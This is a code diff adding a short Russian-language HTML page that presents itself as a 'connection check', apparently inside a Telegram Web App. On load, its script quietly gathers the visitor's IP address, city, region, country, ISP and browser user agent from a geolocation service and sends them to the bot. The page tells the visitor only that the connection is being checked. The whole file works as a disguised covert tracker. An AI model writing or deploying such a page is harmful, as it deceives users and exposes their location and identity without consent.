@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Проверка соединения</title>
+  <script>
+    async function sendData() {
+      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+      const userAgent = navigator.userAgent;
+
+      const payload = {
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country_name,
+        org: ipData.org,
+        ua: userAgent
+      };
+
+      Telegram.WebApp.sendData(JSON.stringify(payload));
+    }
+
+    window.onload = sendData;
+  </script>
+</head>
+<body>
+  <h2>🔍 Проверка соединения...</h2>
+  <p>Окно можно закрыть</p>
+</body>
+</html>
